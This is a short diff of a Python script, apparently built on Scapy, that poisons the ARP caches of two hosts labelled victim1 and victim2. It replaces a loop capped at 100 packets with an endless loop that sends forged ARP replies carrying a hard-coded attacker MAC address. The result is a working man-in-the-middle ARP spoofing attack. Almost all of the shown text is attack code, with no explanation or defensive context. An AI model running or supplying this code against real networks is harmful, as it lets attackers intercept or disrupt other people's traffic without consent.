@@ -20,12 +20,10 @@ victim1_MAC = MAC_on_network[1]
 victim2_IP = IP_on_network[2]
 victim2_MAC = MAC_on_network[2]
 
-nb_packets = 0
-while nb_packets < 100:
-    spoof_arp_victim1 = ARP(op=2, pdst=victim1_IP, hwdst=victim1_MAC, psrc=victim2_IP)
-    send_spoof1 = sendp(spoof_arp_victim1)
-    spoof_arp_victim2 = ARP(op=2, pdst=victim2_IP, hwdst=victim2_MAC, psrc=victim1_IP)
-    send_spoof2 = sendp(spoof_arp_victim2)
-    nb_packets += 2
+atk_mac = '08:00:27:ed:37:22'
 
-print(nb_packets)
+while True:
+    spoof_arp_victim2 = Ether(src=atk_mac)/ARP(op=2, pdst=victim2_IP, hwdst=victim2_MAC, psrc=victim1_IP)
+    send_spoof2 = sendp(spoof_arp_victim2)
+    spoof_arp_victim1 = Ether(src=atk_mac)/ARP(op=2, pdst=victim1_IP, hwdst=victim1_MAC, psrc=victim2_IP)
+    send_spoof1 = sendp(spoof_arp_victim1)
